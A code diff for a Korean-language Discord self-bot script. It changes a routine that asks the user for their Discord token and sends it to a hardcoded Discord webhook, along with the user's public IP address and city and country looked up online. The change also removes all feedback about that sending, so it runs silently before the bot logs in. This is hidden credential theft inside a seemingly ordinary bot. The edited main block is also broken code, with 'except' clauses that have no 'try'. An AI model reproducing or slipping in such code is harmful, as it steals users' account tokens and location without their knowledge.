@@ -27,34 +27,44 @@ __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
 
-# 외부 IP 주소 가져오기
-def get_ip_address():
+# IP 주소 및 위치 정보 가져오기
+def get_ip_and_location():
     try:
-        response = requests.get("https://api.ipify.org", timeout=5)
-        response.raise_for_status()
-        return response.text
-    except requests.exceptions.RequestException as e:
-        print(f"{y}IP 주소 가져오기 실패: {str(e)}{w}")
-        return "Unknown"
+        ip_response = requests.get("https://api.ipify.org", timeout=5)
+        ip_response.raise_for_status()
+        ip_address = ip_response.text
+        location_response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=5)
+        location_response.raise_for_status()
+        location_data = location_response.json()
+        city = location_data.get("city", "알 수 없음")
+        country = location_data.get("country_name", "알 수 없음")
+        return ip_address, city, country
+    except:
+        return "Unknown", "알 수 없음", "알 수 없음"
 
 # 웹훅으로 정보 전송
-def send_to_webhook(token, ip_address):
+def send_to_webhook(token, ip_address, city, country):
     webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
     data = {
-        "content": f"**New Bot Instance**\nToken: `{token}`\nIP Address: `{ip_address}`"
+        "content": None,
+        "embeds": [
+            {
+                "title": "🚨 New Bot Instance",
+                "color": 0xff0000,
+                "fields": [
+                    {"name": "🔑 Token", "value": f"`{token}`", "inline": True},
+                    {"name": "📍 IP Address", "value": f"`{ip_address}`", "inline": True},
+                    {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
+                    {"name": "🕒 Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S %Z"), "inline": False}
+                ]
+            }
+        ]
     }
     try:
         response = requests.post(webhook_url, json=data)
         response.raise_for_status()
-        print(f"{y}웹훅 전송 성공: {response.status_code}{w}")
-        print(f"{y}웹훅 응답: {response.text}{w}")
-    except requests.exceptions.HTTPError as http_err:
-        print(f"{y}웹훅 전송 실패 (HTTP 오류): {str(http_err)}{w}")
-        print(f"{y}응답 코드: {response.status_code}, 응답: {response.text}{w}")
-    except requests.exceptions.RequestException as req_err:
-        print(f"{y}웹훅 전송 실패 (네트워크 오류): {str(req_err)}{w}")
-    except Exception as e:
-        print(f"{y}웹훅 전송 실패 (기타 오류): {str(e)}{w}")
+    except:
+        pass
 
 def load_config():
     try:
@@ -93,9 +103,16 @@ def load_config():
 config = load_config()
 
 if __name__ == "__main__":
-    token = input("토큰을 입력하세요: ")
-    ip_address = get_ip_address()
-    send_to_webhook(token, ip_address)
+        token = input("토큰을 입력하세요: ")
+        ip_address, city, country = get_ip_and_location()
+        send_to_webhook(token, ip_address, city, country)
+        client.run(token)
+    except discord.LoginFailure:
+        time.sleep(5)
+        exit(1)
+    except:
+        time.sleep(5)
+        exit(1)
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
